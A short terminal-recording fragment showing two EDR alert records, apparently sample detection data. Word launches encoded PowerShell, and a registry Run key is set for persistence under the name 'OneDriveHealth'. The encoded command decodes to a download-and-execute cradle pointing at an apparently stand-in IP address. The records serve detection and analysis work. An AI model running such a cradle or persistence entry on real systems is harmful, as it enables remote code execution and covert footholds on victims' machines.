[15.495297, "o", "{\"record_id\":\"EDR-1042\",\"time_utc\":\"2025-04-17T09:12:14Z\",\"host\":\"acct-ws-04\",\"severity\":\"high\",\"rule\":\"Office child process with encoded PowerShell\",\"process\":\"powershell.exe\",\"parent\":\"WINWORD.EXE\",\"command_line\":\"powershell.exe -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcANwAvAGEAcwBzAGUAdABzAC8AYgBvAG8AdABzAHQAcgBhAHAALgBkAGEAdAAnACkA\",\"file_written\":\"C:\\\\ProgramData\\\\OneDriveHealth\\\\update.ps1\",\"file_sha256\":\"27c1b956a376f025da54daeae5b3f9b9d12af076646712a31f4963ee3f743b73\"}\r\n{\"record_id\":\"EDR-1043\",\"time_utc\":\"2025-04-17T09:13:02Z\",\"host\":\"acct-ws-04\",\"severity\":\"medium\",\"rule\":\"Registry persistence\",\"process\":\"powershell.exe\",\"registry_path\":\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",\"value_name\":\"OneDriveHealth\",\"value_data\":\"powershell.exe -File C:\\\\ProgramData\\\\OneDriveHealth\\\\update.ps1\"}\r\n"]
